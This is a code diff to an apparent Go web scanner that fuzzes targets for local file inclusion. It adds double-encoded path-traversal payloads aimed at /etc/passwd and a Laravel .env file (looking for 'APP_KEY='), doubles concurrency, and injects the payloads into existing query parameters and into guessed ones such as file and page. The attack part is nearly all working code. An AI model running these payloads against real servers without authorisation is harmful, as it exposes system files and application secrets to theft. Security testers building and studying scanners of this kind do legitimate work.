@@ -5,11 +5,13 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"regexp"
 	"strings"
 	"sync"
 
 	"github.com/yupiyy/bhyakugan/internal/core"
+	"github.com/yupiyy/bhyakugan/internal/utils"
 )
 
 // TraversalPayload defines a specific LFI payload and what to look for
@@ -45,6 +47,10 @@ var LFIPayloads = []TraversalPayload{
 	{"LFI Unicode (Vertical Two Dot)", "︰/︰/︰/︰/︰/︰/︰/etc/passwd", "root:x:", "linux"}, // U+FE30 -> ..
 	{"LFI Unicode (Fullwidth Solidus)", "..／..／..／..／..／..／..／etc／passwd", "root:x:", "linux"}, // U+FF0F -> /
 	
+	// --- DOUBLE ENCODED (BUG BOUNTY TIP) ---
+	{"LFI Double Encoded Dots", "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:x:", "linux"},
+	{"LFI Double Encoded Dots (Laravel/.env)", "%2e%2e/%2e%2e/%2e%2e/.env", "APP_KEY=", "all"},
+
 	// --- Wrappers & Protocols ---
 	// We prepend ?file= to wrappers because they are typically injected into parameters,
 	// and putting them in the raw path often breaks HTTP clients/servers.
@@ -89,93 +95,72 @@ var LFIPayloads = []TraversalPayload{
 
 // ScanLFI runs the advanced directory traversal fuzzing
 func ScanLFI(baseURL string, client *http.Client, onFound func(core.Finding)) {
-	if baseURL[len(baseURL)-1] != '/' {
-		baseURL += "/"
-	}
-
 	var wg sync.WaitGroup
-	semaphore := make(chan struct{}, 5) 
+	semaphore := make(chan struct{}, 10) 
 	
 	// Collect results
 	var results []string
 	var highestSeverity string = "Medium"
 	var mu sync.Mutex
 
+	// Parse URL to identify parameters for fuzzing
+	u, _ := url.Parse(baseURL)
+	q := u.Query()
+
 	for _, p := range LFIPayloads {
+		// 1. Path-based Testing
 		wg.Add(1)
 		go func(payload TraversalPayload) {
 			defer wg.Done()
 			semaphore <- struct{}{}
 			defer func() { <-semaphore }()
 
-			target := baseURL + payload.Payload
+			target := baseURL
+			// If it's a file path with params, we shouldn't add a slash before payload if payload is a path.
+			// Actually, path-based LFI usually appends to the directory.
+			if !strings.HasSuffix(target, "/") && !strings.Contains(target, "?") { target += "/" }
+			target += payload.Payload
 			
-			resp, err := client.Get(target)
-			if err != nil {
-				return
-			}
-			defer resp.Body.Close()
-
-			body, err := io.ReadAll(resp.Body)
-			if err != nil {
-				return
-			}
-			bodyStr := string(body)
-
-			isTraversal := strings.Contains(payload.Payload, "..") || strings.Contains(payload.Payload, "://")
-			
-			if strings.Contains(bodyStr, payload.Check) {
-				// Base64 Logic
-				if strings.Contains(payload.Payload, "base64-encode") {
-					// 1. Extract Base64 Candidate
-					re := regexp.MustCompile(`[a-zA-Z0-9+/=]{20,}`)
-					matches := re.FindAllString(bodyStr, -1)
-					
-					verified := false
-					decodedSnippet := ""
-
-					for _, m := range matches {
-						if strings.Contains(m, payload.Check) {
-							// Try decode
-							decoded, err := base64.StdEncoding.DecodeString(m)
-							if err == nil {
-								decStr := string(decoded)
-								// 2. Validate Content
-								if strings.Contains(decStr, "<?php") || 
-								   strings.Contains(decStr, "$db") || 
-								   strings.Contains(decStr, "define(") || 
-								   strings.Contains(decStr, "class ") ||
-								   strings.Contains(decStr, "return array") {
-									verified = true
-									decodedSnippet = decStr
-									if len(decodedSnippet) > 50 { decodedSnippet = decodedSnippet[:50] + "..." }
-									break
-								}
-							}
-						}
-					}
-
-					mu.Lock()
-					if verified {
-						results = append(results, fmt.Sprintf("Source Disclosure (%s) - Decoded: %s", payload.Name, decodedSnippet))
-						highestSeverity = "Critical"
-					} else {
-						// Found PD9 header but validation failed or content is junk
-						results = append(results, fmt.Sprintf("Potential LFI (%s) - Base64 header found, content unverified", payload.Name))
-					}
-					mu.Unlock()
-					return 
-				}
-
-				// Standard LFI Logic
-				if isTraversal || strings.HasPrefix(payload.Payload, "/etc/") {
-					mu.Lock()
-					results = append(results, fmt.Sprintf("System File Read (%s) - Found: %s", payload.Name, payload.Check))
-					highestSeverity = "Critical"
-					mu.Unlock()
-				}
-			}
+			checkLFIVector(target, payload, client, &results, &highestSeverity, &mu)
 		}(p)
+
+		// 2. Parameter-based Fuzzing (if params exist)
+		if len(q) > 0 {
+			for param := range q {
+				wg.Add(1)
+				go func(payload TraversalPayload, paramName string) {
+					defer wg.Done()
+					semaphore <- struct{}{}
+					defer func() { <-semaphore }()
+
+					// Clone query to avoid race conditions
+					fuzzU, _ := url.Parse(baseURL)
+					fuzzQ := fuzzU.Query()
+					fuzzQ.Set(paramName, payload.Payload)
+					fuzzU.RawQuery = fuzzQ.Encode()
+					
+					checkLFIVector(fuzzU.String(), payload, client, &results, &highestSeverity, &mu)
+				}(p, param)
+			}
+		} else {
+			// Try common parameters even if not present (?file=, ?page=, etc.)
+			commonParams := []string{"file", "page", "path", "doc", "folder"}
+			for _, cp := range commonParams {
+				wg.Add(1)
+				go func(payload TraversalPayload, paramName string) {
+					defer wg.Done()
+					semaphore <- struct{}{}
+					defer func() { <-semaphore }()
+
+					fuzzU, _ := url.Parse(baseURL)
+					fuzzQ := fuzzU.Query()
+					fuzzQ.Set(paramName, payload.Payload)
+					fuzzU.RawQuery = fuzzQ.Encode()
+					
+					checkLFIVector(fuzzU.String(), payload, client, &results, &highestSeverity, &mu)
+				}(p, cp)
+			}
+		}
 	}
 	wg.Wait()
 
@@ -183,9 +168,86 @@ func ScanLFI(baseURL string, client *http.Client, onFound func(core.Finding)) {
 		fmt.Printf("[!] LFI CONFIRMED at %s (Impacts: %d)\n", baseURL, len(results))
 		onFound(core.Finding{
 			Type:     "Local File Inclusion (LFI)",
-			Target:   baseURL, // Reporting the Endpoint, not the specific payload URL
+			Target:   baseURL,
 			Detail:   fmt.Sprintf("LFI vulnerability detected. Impacted resources:\n- %s", strings.Join(results, "\n- ")),
 			Severity: highestSeverity,
 		})
+	}
+}
+
+func checkLFIVector(target string, payload TraversalPayload, client *http.Client, results *[]string, highestSeverity *string, mu *sync.Mutex) {
+	req, err := http.NewRequest("GET", target, nil)
+	if err != nil {
+		return
+	}
+	utils.SetDefaultHeaders(req, target)
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return
+	}
+	bodyStr := string(body)
+
+	isTraversal := strings.Contains(payload.Payload, "..") || strings.Contains(payload.Payload, "://")
+	
+	if strings.Contains(bodyStr, payload.Check) {
+		// --- REFLECTION CHECK (Anti-FP) ---
+		// If the indicator we found is actually part of our payload and reflected in the body,
+		// it might just be an error message reflecting our input.
+		if strings.Contains(target, payload.Check) && strings.Count(bodyStr, payload.Check) == 1 {
+			// If it only appears once and it's in our URL, it's likely a reflection
+			return 
+		}
+
+		// Base64 Logic
+		if strings.Contains(payload.Payload, "base64-encode") {
+			re := regexp.MustCompile(`[a-zA-Z0-9+/=]{20,}`)
+			matches := re.FindAllString(bodyStr, -1)
+			
+			verified := false
+			decodedSnippet := ""
+
+			for _, m := range matches {
+				if strings.Contains(m, payload.Check) {
+					decoded, err := base64.StdEncoding.DecodeString(m)
+					if err == nil {
+						decStr := string(decoded)
+						if strings.Contains(decStr, "<?php") || 
+						   strings.Contains(decStr, "$db") || 
+						   strings.Contains(decStr, "define(") || 
+						   strings.Contains(decStr, "class ") ||
+						   strings.Contains(decStr, "return array") {
+							verified = true
+							decodedSnippet = decStr
+							if len(decodedSnippet) > 50 { decodedSnippet = decodedSnippet[:50] + "..." }
+							break
+						}
+					}
+				}
+			}
+
+			mu.Lock()
+			if verified {
+				*results = append(*results, fmt.Sprintf("Source Disclosure (%s) - Decoded: %s", payload.Name, decodedSnippet))
+				*highestSeverity = "Critical"
+			} else {
+				*results = append(*results, fmt.Sprintf("Potential LFI (%s) - Base64 header found, content unverified", payload.Name))
+			}
+			mu.Unlock()
+			return 
+		}
+
+		// Standard LFI Logic
+		if isTraversal || strings.HasPrefix(payload.Payload, "/etc/") {
+			mu.Lock()
+			*results = append(*results, fmt.Sprintf("System File Read (%s) - Found: %s", payload.Name, payload.Check))
+			*highestSeverity = "Critical"
+			mu.Unlock()
+		}
 	}
 }
